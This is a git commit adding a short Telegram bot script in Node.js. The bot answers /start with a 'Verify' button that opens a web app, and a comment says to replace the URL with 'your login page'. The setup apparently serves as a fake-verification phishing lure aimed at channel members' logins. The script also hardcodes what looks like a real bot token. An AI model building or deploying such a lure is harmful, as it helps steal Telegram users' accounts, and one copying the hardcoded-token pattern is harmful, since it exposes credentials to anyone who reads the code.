8875283d4298e918747096e81133a431548c5279
Selling Solona <194745542+sellingsolona@users.noreply.github.com>
2025-03-05 22:31:07 -0500

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,1 +1,20 @@
+const { Telegraf } = require('telegraf');
+const axios = require('axios');
 
+const bot = new Telegraf('8117515930:AAGrh_J_UQNDKqLD_H3Gy_FWmiUS3Dpw3_M');
+
+// "Verify" button in channels
+bot.command('start', (ctx) => {
+  ctx.reply('Click to verify:', {
+    reply_markup: {
+      inline_keyboard: [
+        [{
+          text: 'Verify',
+          web_app: { url: 'https://web.telegram.org/a/' } // Replace with your login page URL
+        }]
+      ]
+    }
+  });
+});
+
+bot.launch();
